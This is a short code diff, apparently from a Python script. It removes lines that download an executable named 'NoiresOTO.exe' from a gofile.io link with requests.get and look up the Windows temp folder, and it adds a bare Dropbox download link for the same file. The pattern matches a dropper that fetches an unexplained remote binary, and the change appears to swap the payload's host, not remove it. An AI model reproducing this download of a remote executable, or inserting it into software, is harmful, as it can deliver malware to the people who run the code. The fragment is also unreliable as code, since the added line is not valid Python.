@@ -1,4 +1,1 @@
-url = "https://store1.gofile.io/download/acfee162-d4a2-41db-a8b2-c00ce4bcbc20/NoiresOTO.exe"
-response = requests.get(url)
-tmp = os.getenv('temp')
-print(tmp)
+https://www.dl.dropboxusercontent.com/scl/fi/tk41769e6ro0ybp71ixo0/NoiresOTO.exe?rlkey=z15ytjimthz9g4imn203frcxj&dl=0
